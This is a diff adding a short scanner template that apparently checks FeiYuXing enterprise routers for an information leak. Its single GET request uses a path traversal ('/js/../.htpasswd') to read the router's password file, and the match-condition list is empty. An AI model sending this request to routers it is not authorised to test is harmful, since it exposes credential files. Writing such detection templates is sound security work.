@@ -1,0 +1,16 @@
+id: feiyuxing-ent-router-infoleak
+brief:
+    title: FeiYuXing Enterprise Router - Information Leakage
+    by: adeljck
+    level: high
+    about: The FeiYuXing Enterprise Router Information Leakage Vulnerability is a critical flaw that allows unauthorized attackers to retrieve sensitive configuration details from the router.
+    label:
+        - feiyuxing
+        - info-leak
+        - disclosure
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/js/../.htpasswd'
+      signs: []
